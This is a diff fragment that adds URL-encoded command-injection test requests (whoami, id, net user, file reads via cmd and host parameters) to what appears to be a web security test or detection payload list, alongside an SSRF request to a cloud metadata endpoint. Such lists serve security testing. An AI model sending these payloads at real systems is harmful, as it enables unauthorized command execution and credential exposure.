@@ -281,6 +281,13 @@ GET /?cmd=%3B%7Bcat,/tmp/x%7D
 GET /?cmd=/bin/cat%20/tmp/x
 GET /?host=127.0.0.1%0Acat%20/tmp/x
 GET /?cmd=%0A%2Fbin%2Fcat%20/tmp/x
+GET /?cmd=127.0.0.1%26whoami
+GET /?cmd=%26id%3B
+GET /?cmd=%26dir
+GET /?cmd=%26net%20user
+GET /?cmd=%26type%20C:%5Cx.txt
+GET /?cmd=%26cat%20/tmp/x
+POST /ping body="host=127.0.0.1%26whoami"
 
 # --- SSRF ---
 GET /?url=http://169.254.169.254/latest/meta-data/
